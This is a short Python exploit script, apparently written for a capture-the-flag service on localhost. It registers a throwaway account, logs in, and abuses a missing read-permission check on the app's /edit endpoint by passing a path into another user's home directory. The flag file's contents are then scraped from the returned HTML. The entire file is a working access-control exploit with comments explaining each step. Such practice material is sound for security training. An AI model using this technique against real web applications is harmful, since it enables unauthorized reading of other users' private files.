
import secrets
import requests
import string
from bs4 import BeautifulSoup

# the exploit must know where to find the service (ip, port) as well as the
# username of the flag holder and the name of the flag file
IP = "127.0.0.1"
PORT = 5000
USERNAME = "o090f2a"
FILE = "05cd2aac.button"

# first, we generate random user data to create a (probably) untaken account!
username = f"{secrets.choice(string.ascii_lowercase)}{secrets.token_hex(2+secrets.randbelow(5))}"
password = secrets.token_hex()

credentials = {
    'username': username,
    'password': password
}

# Then we use the credentials to generate an account
url = f"http://{IP}:{PORT}/register"
res = requests.post(url, data = credentials)

# then we create a session to operate from within our account
s = requests.Session()
res = s.post(f"http://{IP}:{PORT}/login", data = credentials)
res = s.get(f"http://{IP}:{PORT}/login", allow_redirects=False)
if res.status_code != 302:
    print("The service is down!")
    exit()

# if you want to edit a file, you need write access. But when opening for edit,
# the app never checkes weather you have read access. You can use the edit window
# to show the content of other users files
res = s.get(f"http://{IP}:{PORT}/edit?button=/home/{USERNAME}/{FILE}")

# we use BeautifulSoup to extract the flag from all this HTML noice.
soup = BeautifulSoup(res.text, 'html.parser')
flag = soup.find('textarea').getText()

print(flag)